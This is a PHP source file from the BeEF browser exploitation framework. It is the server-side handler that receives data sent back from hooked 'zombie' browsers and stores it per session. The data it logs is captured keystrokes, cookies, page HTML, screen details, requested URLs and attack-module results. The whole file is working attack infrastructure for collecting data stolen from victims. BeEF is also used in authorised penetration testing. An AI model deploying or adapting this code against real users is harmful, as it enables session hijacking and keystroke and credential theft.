<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../include/globals.inc.php");
	require_once("../include/common.inc.php");

	session_name(SESSION_NAME);
	session_start();

	check_zombie_dir();

	// check parameters 
 	if(!isset($_GET["action"])) beef_error('no action');
 	if(!isset($_GET["data"])) beef_error('no data');

	// set params
	$action = $_GET["action"];
	$data = $_GET["data"];

	// check if the data is results from a module
	if(isset($_SESSION[$action])) {
		
		// make time stamp
		$time = time();
		$time_html = '<b>' . date("F j, Y, g:i a", $time) . '</b>';

		$encoded_data = html_encode_all($data);
		$encoded_data = convert_10_br($encoded_data);

		file_put_contents($_SESSION[$action], $time_html . "<br>\n", FILE_APPEND);
		file_put_contents($_SESSION[$action], $encoded_data . "<br>\n", FILE_APPEND);

		// the data will be encoded in beef_log()
		beef_log("Module Result: \n" . $data, "Module Result: \n" . $data);

		exit;
	}

	// take action based on the action param
	switch ($action) {
		case "kl": // key registered
			append_data(KEYLOG_FILENAME, $data);
			break;
		case "screen": // screen details
			save_data(SCREEN_FILENAME, $data);
			beef_log("", "Screen: " . $data);
			break;
		case "html": // html details
			$stripped_data = stripslashes($data);
			append_data(HTML_FILENAME, $stripped_data);
			beef_log("", "HTML Contents: " . $stripped_data);
			break;
		case "cookie": // cookie details
			save_data(COOKIE_FILENAME, $data);
			beef_log("", "Cookie: " . $data);
			break;
		case "loc": // location details
			save_data(LOC_FILENAME, $data);
			beef_log("", "Requested URL: " . $data);			
			break;
		default: // unexpected 
			beef_error("unknown action: $action"); 
			beef_log("", "Unknown Action: " . $action);			
	}	

	// --[ CHECK_ZOMBIE_DIR
	function check_zombie_dir() {
		$zombie_dir = ZOMBIE_TMP_DIR . session_id();

		// create a directory for this zombie if it doens't exist
		if(!file_exists($zombie_dir)) {
			mkdir($zombie_dir);
		}
	}

	// --[ APPEND_DATA
	function append_data($filename, $data) {
			if (empty($data)) { beef_error('no data to save - append data'); };

			$zombie_dir = ZOMBIE_TMP_DIR . session_id();
			$zombie_data_file = $zombie_dir . "/" . $filename;
			file_put_contents($zombie_data_file, $data, FILE_APPEND);
	}

	// --[ SAVE_DATA
	function save_data($filename, $data) {
		if (empty($data)) { beef_error('no data to save - write data'); };

		$zombie_dir = ZOMBIE_TMP_DIR . session_id();
		$zombie_data_file = $zombie_dir . "/" . $filename;
		file_put_contents($zombie_data_file, $data);
	}
?>
